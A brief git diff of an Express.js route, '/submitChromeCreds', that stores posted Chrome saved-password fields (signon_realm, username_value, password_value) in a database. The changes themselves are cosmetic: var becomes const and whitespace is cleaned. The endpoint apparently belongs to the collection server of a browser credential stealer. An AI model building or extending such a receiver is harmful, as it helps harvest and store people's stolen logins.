@@ -18,7 +18,7 @@ const express = require('express');
 const router = express.Router();
 const log = require('../bin/loggers/logger-chrome');
 const dbDetails = require('/var/www_conf/BunnyAPI/db_conf');
-var db = require('../conf/db');
+const db = require('../conf/db');
 
 /* set the post path and set the logic */
 router.post('/submitChromeCreds', function(req, res, next) {
@@ -40,8 +40,8 @@ router.post('/submitChromeCreds', function(req, res, next) {
       db.query(query,
           [ranStamp, el.signon_realm, el.username_value, el.password_value],
           function(err, status) {
-            if (err) { 
-              return next(err); 
+            if (err) {
+              return next(err);
             }
           }
       );
